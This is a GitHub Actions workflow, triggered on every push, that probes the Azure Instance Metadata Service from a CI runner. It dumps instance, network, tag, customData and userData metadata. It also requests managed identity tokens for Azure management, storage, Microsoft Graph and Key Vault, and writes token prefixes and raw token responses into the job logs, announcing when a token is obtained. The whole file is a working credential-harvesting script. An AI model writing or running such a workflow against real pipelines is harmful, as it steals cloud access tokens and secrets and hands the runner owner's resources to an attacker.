name: IMDS Extract
on: push
jobs:
  imds:
    runs-on: ubuntu-latest
    steps:
      - name: Full IMDS metadata extraction
        run: |
          echo "=== FULL AZURE INSTANCE METADATA ==="
          IMDS="http://169.254.169.254/metadata"
          HDR="Metadata:true"
          
          echo "--- Instance ---"
          curl -sf -H "$HDR" "$IMDS/instance?api-version=2021-02-01" | python3 -m json.tool
          
          echo ""
          echo "--- Attested Data ---"
          curl -sf -H "$HDR" "$IMDS/attested/document?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || echo "attested: blocked"
          
          echo ""
          echo "--- Scheduled Events ---"
          curl -sf -H "$HDR" "$IMDS/scheduledevents?api-version=2019-08-01" | python3 -m json.tool 2>/dev/null || echo "events: blocked"

      - name: Managed Identity Token
        run: |
          IMDS="http://169.254.169.254/metadata"
          HDR="Metadata:true"
          
          echo "=== MANAGED IDENTITY TOKEN REQUEST ==="
          echo "--- Default identity ---"
          RESP=$(curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1)
          if echo "$RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'TOKEN_TYPE: {d.get(\"token_type\")}\nEXPIRES: {d.get(\"expires_on\")}\nACCESS_TOKEN_PREFIX: {d.get(\"access_token\",\"\")[:30]}...')" 2>/dev/null; then
            echo "!!! MANAGED IDENTITY TOKEN OBTAINED !!!"
          else
            echo "Response: $RESP"
          fi

          echo ""
          echo "--- Storage identity ---"
          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1 | head -c 500
          echo ""

          echo ""
          echo "--- Graph identity ---"
          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>&1 | head -c 500
          echo ""

          echo ""
          echo "--- Vault identity ---"
          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>&1 | head -c 500
          echo ""

      - name: Network infrastructure
        run: |
          IMDS="http://169.254.169.254/metadata"
          HDR="Metadata:true"
          
          echo "=== NETWORK METADATA ==="
          curl -sf -H "$HDR" "$IMDS/instance/network?api-version=2021-02-01" | python3 -m json.tool
          
          echo ""
          echo "=== TAGS ==="
          curl -sf -H "$HDR" "$IMDS/instance/compute/tags?api-version=2021-02-01" 2>&1
          echo ""
          
          echo ""
          echo "=== CUSTOM DATA ==="
          curl -sf -H "$HDR" "$IMDS/instance/compute/customData?api-version=2021-02-01&format=text" 2>&1 | head -c 500
          echo ""
          
          echo ""
          echo "=== USER DATA ==="
          curl -sf -H "$HDR" "$IMDS/instance/compute/userData?api-version=2021-03-01&format=text" 2>&1 | head -c 500
          echo ""
